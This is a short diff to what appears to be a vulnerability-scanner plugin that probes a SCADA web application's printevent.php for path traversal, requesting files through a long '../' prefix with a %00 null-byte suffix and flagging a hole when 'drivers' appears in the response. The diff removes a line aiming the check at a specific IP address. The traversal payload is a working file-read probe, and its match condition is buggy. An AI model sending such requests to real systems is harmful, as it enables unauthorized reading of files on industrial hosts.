@@ -13,12 +13,10 @@ def audit(arg):
    for key in keys:
         path = '../'*20
         target ="{url}/modules/event/server/printevent.php?action={path}{key}%00.htm".format(url=arg,path=path,key=key)
-        code, head,res, errcode, _   = curl.curl2(target) 
+        code, head,res, errcode, _   = curl.curl2(target)
         if code == 200 and ('drivers' or 'root') in res:
             security_hole(target)
-            break
-        
 
-if __name__ == '__main__':
+            return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('dfe_scada', 'http://221.214.179.228:5000')[1])
